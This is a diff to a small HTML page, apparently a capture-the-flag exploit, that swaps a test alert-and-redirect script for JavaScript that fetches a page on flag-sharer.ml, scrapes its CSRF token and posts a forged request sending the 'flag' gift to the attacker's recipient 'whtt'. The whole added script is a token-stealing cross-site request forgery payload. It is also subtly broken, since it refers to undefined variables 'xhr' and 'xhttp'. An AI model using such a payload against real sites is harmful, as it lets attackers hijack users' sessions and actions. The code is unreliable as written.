@@ -1,9 +1,36 @@
 <html>
     <body>
         <h1> medivi </h1>
-        <script>
-            alert(1); 
-            window.top.location.href='https://www.google.com';
+<script>
+function readBody(xhr) {
+var data;
+if (!xhr.responseType || xhr.responseType === "text") {
+data = xhr.responseText;
+} else if(xhr.responseType === "document") {
+data = xhr.responseXML;
+} else {
+data = xhr.response;
+}
+var parser = new DOMParser();
+var resp = parser.parseFromString(data, "text/html");
+token = resp.getElementsByName('csrf')[0].value; //grab first available token
+att(token);
+return data;
+}
+let xhr2 = new XMLHttpRequest();
+xhr2.onreadystatechange = function () {
+    if (xhr2.readyState == 4) {
+        response = readBody(xhr);
+    }
+}
+xhr2.open(`get`, `https://flag-sharer.ml/gifts`);
+xhr2.send();
+function att(token) {
+let xhr = new XMLHttpRequest();
+xhr.open(`post`,`https://flag-sharer.ml/send`, true);
+xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.send("recipient=whtt&gift=flag&csrf="+token);
+}
         </script>
     </body>
 </html>
